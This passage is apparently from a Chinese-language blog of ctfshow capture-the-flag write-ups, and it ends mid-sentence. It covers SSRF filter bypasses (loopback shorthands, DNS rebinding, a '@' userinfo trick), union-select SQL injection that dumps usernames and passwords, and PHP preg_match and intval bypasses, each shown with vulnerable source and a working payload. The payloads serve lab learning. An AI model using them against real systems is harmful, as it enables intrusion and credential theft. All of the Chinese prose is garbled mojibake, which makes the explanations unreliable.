class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-keyword">if</span>((<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$host</span>)&lt;=<span class="hljs-number">5</span>))&#123;<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>host é•¿åº¦å°äºç­‰äº5<br>ç”¨å‰é¢çš„åŠæ³•å³å¯<br>payload:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-number">127.1</span>/flag.php<br><span class="hljs-attribute">url</span><span class="hljs-operator">=</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><p>ä¸è´´ä»£ç äº†ï¼ŒåŒä¸Šï¼Œæœ¬é¢˜host lenå°äºç­‰äº3<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>/flag.php<br></code></pre></td></tr></table></figure><h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;http&#x27;</span>||<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;scheme&#x27;</span>]===<span class="hljs-string">&#x27;https&#x27;</span>)&#123;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">gethostbyname</span>(<span class="hljs-variable">$x</span>[<span class="hljs-string">&#x27;host&#x27;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&#x27;&lt;/br&gt;&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">filter_var</span>(<span class="hljs-variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;ip!&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;scheme&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é¢˜æœ‰ä¸¤ç§è§£æ³•â€”â€”302è·³è½¬å’Œdnsé‡ç»‘å®š<br>ä½†æ˜¯æœ¬é¢˜é¢˜è§£åªæ”¾ä¸€ç§(è¿˜æ²¡ææ‡‚VPSğŸ¥¶)<br>ç½‘å€é€ä¸Š<br><a href="http://ceye.io/">dnsé‡ç»‘å®š</a><br>dns rebindingé‡Œç¬¬ä¸€ä¸ªåŸŸåéšæ„ï¼Œç¬¬äºŒä¸ªåŸŸåä¸ºè‡ªå·±çš„<br><img src="/images/24J67YGL9HRBAI7BZTD.png"><br>æŠŠåŸŸåæ¢ä¸ºidentifieré‡Œçš„å†…å®¹,åŸŸåå‰é¢è¦åŠ r.<br>éœ€è¦å¤šè¯•å‡ æ¬¡<br>payload:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>r.****/flag.php<br><br></code></pre></td></tr></table></figure><p><img src="/images/fc053d981de7ffd57c75c9d588a89a21.png"></p><h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$x</span>=<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="hljs-variable">$url</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/xhmerry/article/details/1550928#:~:text=%3A%20%E5%8C%B9%E9%85%8D%E5%89%8D%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E5%87%BA%E7%8E%B0%200%20%E6%AC%A1%E6%88%96%201%20%E6%AC%A1%E3%80%82%20%2B%20%3A,%E6%81%B0%E5%B7%A7%E5%87%BA%E7%8E%B0%20n%20%E6%AC%A1%E3%80%82%20%7Bn%2C%7D%20%3A%20%E5%A4%A7%E4%BA%8E%E7%AD%89%E4%BA%8E%20n%20%E6%AC%A1%E3%80%82">æ­£åˆ™è¡¨è¾¾å¼å­—ç¬¦</a></p><ul><li><p>^ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„å¼€å§‹ä½ç½®ã€‚å¦‚æœè®¾ç½®äº† RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ^ ä¹ŸåŒ¹é… â€˜&#x2F;nâ€™ æˆ– â€˜&#x2F;râ€™ ä¹‹åçš„ä½ç½®ã€‚</p></li><li><p>$ ï¼šåŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®ã€‚å¦‚æœè®¾ç½®äº†RegExp å¯¹è±¡çš„ Multiline å±æ€§ï¼Œ$ ä¹ŸåŒ¹é… â€˜&#x2F;nâ€™ æˆ– â€˜&#x2F;râ€™ ä¹‹å‰çš„ä½ç½®ã€‚</p></li><li><p>&#x2F;..* ï¼šåŒ¹é…å‰é¢çš„å­è¡¨è¾¾å¼é›¶æ¬¡æˆ–å¤šæ¬¡ã€‚ä¾‹å¦‚ï¼Œzo* èƒ½åŒ¹é… â€œzâ€ ä»¥åŠ â€œzooâ€ã€‚* ç­‰ä»·äº{0,}ã€‚</p></li></ul><p>æ‰€ä»¥ï¼Œæ­£åˆ™è¡¨è¾¾å¼è¡¨æ˜ä»¥<code>http://ctf.</code>å¼€å§‹ï¼Œä»¥showç»“å°¾</p><p>payloadï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php?show<br>or<br>url=http:<span class="hljs-regexp">//</span>ctf.@<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/flag.php<span class="hljs-comment">#show</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://username:password@hostname:9090/path?arg=value#anchor&#x27;</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_SCHEME));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_USER));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PASS));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_HOST));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PORT));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_PATH));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_QUERY));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">parse_url</span>(<span class="hljs-variable">$url</span>, PHP_URL_FRAGMENT));<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">8</span>) &#123;<br>  [<span class="hljs-string">&quot;scheme&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br>  [<span class="hljs-string">&quot;host&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br>  [<span class="hljs-string">&quot;port&quot;</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br>  [<span class="hljs-string">&quot;user&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br>  [<span class="hljs-string">&quot;pass&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br>  [<span class="hljs-string">&quot;path&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br>  [<span class="hljs-string">&quot;query&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br>  [<span class="hljs-string">&quot;fragment&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br>&#125;<br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;http&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;username&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">8</span>) <span class="hljs-string">&quot;hostname&quot;</span><br><span class="hljs-keyword">int</span>(<span class="hljs-number">9090</span>)<br><span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;/path&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;arg=value&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;anchor&quot;</span><br><br></code></pre></td></tr></table></figure><p>å½“parse_url()è§£æåˆ°é‚®ç®±æ—¶ï¼š@å‰é¢æ˜¯user<br>file_get_contents()ä¼šè®¿é—®host:port&#x2F;pathï¼Œä¸useræ— å…³</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqlæ³¨å…¥</title>
    <link href="/2023/09/15/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/09/15/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>å¸¸è§„sqlæ³¨å…¥<br>payload:</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() --+<br><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;ctfshow_user&#x27; --+<br><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> id,username,password <span class="hljs-keyword">from</span> ctfshow_user --+<br><br></code></pre></td></tr></table></figure><p>æˆ–<br>payload:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">-<span class="hljs-number">1</span>&#x27; or id=&#x27;<span class="hljs-number">26</span> <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>phpç‰¹æ€§</title>
    <link href="/2023/09/14/phptexin/"/>
    <url>/2023/09/14/phptexin/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]/&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹ä»£ç å‘ç°<br>preg_matchè¿‡æ»¤0-9ï¼Œå³å‘ç°æœ‰0-9ï¼Œå°±è¾“å‡ºno no noï¼Œç„¶è€Œintvalå‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›å˜é‡çš„æ•´æ•°å€¼ï¼Œä¸¤è€…ç›¸äº’çŸ›ç›¾</p><p>è¿™é‡Œå¯ä»¥é€šè¿‡æ•°ç»„ç»•è¿‡ï¼Œæ„é€ payloadï¼š?num[]&#x3D;<br><img src="/images/00.png"></p><p>è·å¾—flag</p><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç å‘ç°ï¼Œç¬¬ä¸€ä¸ªifæ˜¯éªŒè¯numæ˜¯å¦å­˜åœ¨ï¼Œç¬¬äºŒä¸ªiféªŒè¯numæ˜¯å¦ä¸º4476ï¼Œå¦‚æœæ˜¯å°±å‡ºè¾“å‡ºnononoï¼Œä½†ç¬¬ä¸‰ä¸ªifæ˜¯éªŒè¯num<strong>å–æ•´</strong>åæ˜¯å¦ä¸º4476ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥éšä¾¿å–ä¸€ä¸ª4476.0-9ï¼Œç»è¿‡intvalå–æ•´åå³ä¸º4476ç¬¦åˆæ¡ä»¶ï¼Œè¾“å‡ºflag</p><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç <br>å…ˆçœ‹ç¬¬ä¸€ä¸ªif<br>preg_match()å‡½æ•°æ˜¯ç”¨äºä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…<br>ç¬¬ä¸€ä¸ªifçš„æ„æ€æ˜¯å¦‚æœaçš„å¼€å¤´å’Œç»“å°¾éƒ½æ˜¯phpï¼Œåˆ™è¿›å…¥ä¸‹ä¸€ä¸ªif<br>&#x2F;^php$&#x2F;imä¸­ <strong>^</strong>è¡¨ç¤ºå¼€å¤´ **$**è¡¨ç¤ºç»“å°¾ &#x2F;iè¡¨ç¤ºå¯¹å¤§å°å†™ä¸æ•æ„Ÿ &#x2F;mè¡¨ç¤ºå¤šè¡ŒåŒ¹é…</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(preg_match(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>)</span></span>)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªifçš„æ„æ€æ˜¯åŒ¹é…aå¼€å¤´å’Œç»“å°¾æ˜¯phpï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼Œå¦‚æœå¼€å¤´ç»“å°¾ä¸ºphpï¼Œåˆ™è¾“å‡ºhacker</p><p>ä»”ç»†å¯¹æ¯”å‘ç°ï¼Œç¬¬äºŒä¸ªifçš„è¿‡æ»¤å¯¹æ¯”ç¬¬ä¸€ä¸ªå°‘äº†ä¸€ä¸ªå¤šè¡ŒåŒ¹é…&#x2F;mï¼Œè¿™å¯ä»¥ç”¨åˆ°Apache HTTPDæ¢è¡Œè§£ææ¼æ´<br><a href="https://blog.csdn.net/qq_46091464/article/details/108278486">ä¼ é€é—¨</a><br>å¤§æ¦‚æ„æ€æ˜¯ï¼šä»¥å‰çš„1.phpå¯ä»¥ç”¨1%0aphpè®¿é—®ï¼Œ%0aè¡¨ç¤ºæ¢è¡Œç¬¦ï¼Œé‚£ä¹ˆç»¼ä¸Šæ‰€è¿°ï¼Œå°±å¯ä»¥ç»•è¿‡å‡½æ•°çš„è¿‡æ»¤<br>æ„é€ payloadï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=a%0aphp<br></code></pre></td></tr></table></figure><p>a%0aphp,é¦–å…ˆæ˜¯preg_matchä¸­çš„$(åŒ¹é…ç»“å°¾)åŒ¹é…a%0aphpä¸­çš„æ¢è¡Œç¬¦ï¼Œè¿™ä¸ªæ—¶å€™ä¼šåŒ¹é…åˆ°%0a(å°†%0aå½“ä½œæ¢è¡Œ)ï¼Œé‚£ä¹ˆa%0aphpåé¢çš„phpå› ä¸ºpreg_matchå‡½æ•°æœ‰ä¸ª&#x2F;m(åŒ¹é…å¤šè¡Œ)å°±æ˜¯å•ç‹¬çš„ä¸€è¡Œäº†ï¼Œæ»¡è¶³ç¬¬ä¸€ä¸ªifï¼Œè¦æ±‚è¡Œå¼€å§‹å’Œç»“å°¾éƒ½æ˜¯php</p><p>å…¶æ¬¡æ˜¯ç¬¬äºŒä¸ªifï¼Œç¬¬äºŒä¸ªifè¦æ±‚$aä¸­å¼€å¤´å’Œç»“å°¾æ²¡æœ‰phpï¼Œè€Œè¿™ä¸ªpreg_matchå‡½æ•°ä¸­æ²¡æœ‰&#x2F;måŒ¹é…å¤šè¡Œï¼Œæ‰€ä»¥å°±ç›´æ¥åŒ¹é…abcï¼Œabcä¸æ»¡è¶³ç¬¬äºŒä¸ªifï¼Œæ‰€ä»¥è¾“å‡ºflag<br><img src="/images/232.png"></p><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è§£é¢˜æ–¹å¼ä¸90é¢˜ä¸€æ ·ï¼Œç¬¬ä¸€ä¸ªiféªŒè¯numæ˜¯å¦åˆæ 